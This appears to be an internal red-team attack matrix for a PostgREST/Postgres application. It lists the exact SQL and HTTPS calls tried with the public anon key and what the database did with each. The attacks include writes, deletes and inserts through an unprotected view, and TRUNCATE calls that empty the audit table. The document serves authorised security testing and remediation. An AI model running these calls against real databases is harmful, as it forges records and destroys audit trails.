# Security attack matrix

**31 August 2026.** Every forgery attempted during the Phase 1 red-team, the exact call, the role,
and what the database did. **Every attempt ran inside a transaction that was rolled back. Nothing in
the database was altered.** The one exception is the remote HTTPS proof, which wrote a column back to
its own existing value (a semantic no-op) to prove the path is reachable with the anon key.

Method: `set local role anon` / `set local role authenticated` over a `postgres` connection for the
role-scoped attempts; a real anon-key `fetch` against the deployed PostgREST endpoint for the remote
proof. `[FORGED]` = the write succeeded. `[refused]` = the database rejected it (error quoted).

---

## A · The auto-updatable view bypass — the critical finding

The base tables are protected; the views over them are not (`postgres`-owned, no `security_invoker`,
INSERT/UPDATE/DELETE granted to `authenticated`, SELECT to `anon`).

### Remote proof, real anon key, over HTTPS

| Call | Result |
|---|---|
| `PATCH /rest/v1/master_batch?id=eq.<id>` `{label:…}` | **401** `permission denied for table master_batch` |
| `PATCH /rest/v1/v_live_batch?id=eq.<id>` `{label:…}` (same row) | **200** — row returned, write accepted |

The second call is the whole finding: the anon key that ships in the web bundle and the APK writes
`master_batch` through the view.

### Role-scoped attempts through `v_live_batch` (rolled back)

| # | Attempt | Role | Result |
|---|---|---|---|
| A1 | `update v_live_batch set label = label` (no-op, path proof) | anon | **[FORGED]** rows=1 |
| A2 | `update v_live_batch set start_at = start_at - interval '6 hours'` (move H0) | anon | **[refused]** — `H0 of MB-… is frozen (batch is active)` (`trg_activation_is_one_way`) |
| A3 | `update v_live_batch set status='draft'` (un-activate) | anon | **[refused]** — `cannot return to draft from active. Activation is one-way` |
| A4 | `update v_live_batch set activated_by=null, activated_at=now()` | anon | **[FORGED]** rows=1 — authorship of activation rewritten |
| A5 | `update v_live_batch set config = config || '{"forged":true}'` (Day-0 rest durations) | anon | **[FORGED]** rows=1 |
| A6 | `update v_live_batch set process_definition_id = <ROUTE-2026A>` on an ACTIVE batch | anon | **[FORGED]** rows=1 — every activity's meaning repointed |
| A7 | `delete from v_live_batch where id=…` | anon | **[FORGED]** rows=1 — batch deleted |
| A8 | `insert into v_live_batch(code,label,process_definition_id,start_date,status) values('MB-FORGED',…)` | anon | **[FORGED]** rows=1 — fabricated batch created |
| A9 | `update v_deviation_open set state=…, decided_by_role='gm', decision_reason='forged'` | anon | path open (blocked in my run only by a bad enum literal; the column set is writable — same mechanism as A1–A8) |

**Reading:** the `0034` immutability triggers (A2, A3) hold even through the view — good. Everything
they do **not** explicitly cover (authorship, config, definition swap, delete, insert) is forgeable
by anon. The triggers are a targeted patch; the view layer is the systemic hole beneath them.

---

## B · TRUNCATE — RLS does not apply

| # | Attempt | Role | Result |
|---|---|---|---|
| B1 | `truncate table audit_event` | anon | **[FORGED]** — audit trail emptied |
| B2 | `truncate table batch_activity cascade` | anon | **[FORGED]** |
| B3 | `truncate table evidence_media cascade` | anon | **[FORGED]** |
| B4 | `truncate table audit_event` | authenticated | **[FORGED]** |

Row-level security governs `DELETE`, not `TRUNCATE`; the append-only `BEFORE DELETE` trigger on
`audit_event` never fires. One call erases the entire trail.

---

## C · Direct base-table writes — the controls that held

| # | Attempt | Role | Result |
|---|---|---|---|
| C1 | `update master_batch set label=…` (base table, remote) | anon | **[refused]** 401 `permission denied` |
| C2 | `update batch_activity set actual_end = now()` | authenticated | **[refused]** `permission denied for table batch_activity` |
| C3 | `insert into gate_rule(…)` | anon | rows=0 — RLS filtered the source subquery to empty; no row created |
| C4 | `update process_activity set duration_target_max_hr=999` | authenticated | rows=0 under `ref_write` `WITH CHECK has_role('admin')` — an actual admin JWT would satisfy it (§15) |

`batch_activity` grants no client write, confirming the pre-seeded row. The base-table layer is
sound; the view layer (section A) is where it leaks.

---

## D · The dev clock (suspicion 4)

| # | Attempt | Role | Result |
|---|---|---|---|
| D1 | `select set_dev_clock_h(<batch>, 200)` | anon | **[refused]** — `assert_dev_clock_writer`: dev-mode + admin/gm required |
| D2 | reachability: any ACTUAL/AUDIT writer calling `get_effective_now`? | — | **none** — clock is isolated from the write paths |

**Reassuring.** Granted to anon at the ACL level, but defended in the body. Timestamps are not
deniable through the clock.

---

## E · Actuals overwrite (suspicion 1)

Confirmed by reading the **deployed** `submit_activity` body (probe of `pg_proc.prosrc`, not the
migration file):

- line 29: `if ba.state not in ('READY','IN_PROGRESS','RETURNED') then raise` — a COMPLETED activity
  cannot be re-submitted directly.
- line 180 / 201: `actual_end = coalesce(p_actual_end, actual_end, …)` — the caller's parameter wins.
- no `BEFORE UPDATE` trigger protects `actual_start`/`actual_end`.

**Reachable overwrite paths:** repeated submits while IN_PROGRESS (evidence outstanding); or
`return_activity` → RETURNED → submit with a new time. The prior actual is overwritten, not
superseded. Confirmed.

---

## F · Identity (operator/actor)

| Check | Result |
|---|---|
| Any write RPC take a caller-supplied actor uuid? | **No** — 28 write RPCs inspected; every uuid param is a target entity or assignee/instrument, never the actor |
| Do the actual/lab/deviation/occupancy writers read `auth.uid()`? | **Yes**, all of them |

Identity is not forgeable through the RPCs. The "no actor recorded" on the demo batch is the staging
script running as `postgres`, which has no `auth.uid()`.

---

## What was NOT attempted, and why

- **Evidence storage-object deletion** — needs a storage service key not present on this machine; the
  evidence tests skip for the same reason. Reachability of a direct Storage `DELETE` by a client is
  therefore **unproven**, not cleared.
- **The parallel team's `lab_*` tables and the two capture screens** — out of boundary. Not probed.
- **Full ten-transition state matrix** (complete-twice, backward, skip-gate) — the top-level state
  guard was confirmed (line 29), but each forbidden transition was not individually forged. Gap.
- **`audit_event` append-only triggers under UPDATE/DELETE** — present, not re-forged this pass.
- **The A9 manager-decision forge** — the write path is open (same view mechanism as A1–A8); my
  single attempt used an invalid enum literal and there were no open deviations staged to target, so
  it is reported as *path-open, not end-to-end demonstrated*.